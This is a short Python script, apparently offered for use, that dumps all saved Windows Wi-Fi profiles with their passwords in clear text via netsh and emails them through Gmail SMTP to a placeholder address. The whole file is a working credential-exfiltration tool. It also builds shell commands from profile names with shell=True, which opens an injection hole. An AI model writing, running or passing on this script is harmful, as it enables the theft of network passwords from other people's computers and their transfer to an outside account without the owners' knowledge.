import subprocess
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def get_wifi_passwords():
    profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
    profile_names = re.findall(r"(?:Profile)\s*:\s(.*)", profiles_output)

    wifi_list = []
    for name in profile_names:
        name = name.strip()  # tira espaços extras só pra garantir
        profile_info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True, text=True)
        wifi_list.append(profile_info + "\n")

    return ''.join(wifi_list)

if __name__ == "__main__":
    EMAIL = "YOUR_EMAIL@gmail.com"
    APP_PASSWORD = "YOUR_APP_PASSWORD"

    wifi_info = get_wifi_passwords()
    print(wifi_info)

    send_mail(EMAIL, APP_PASSWORD, wifi_info)
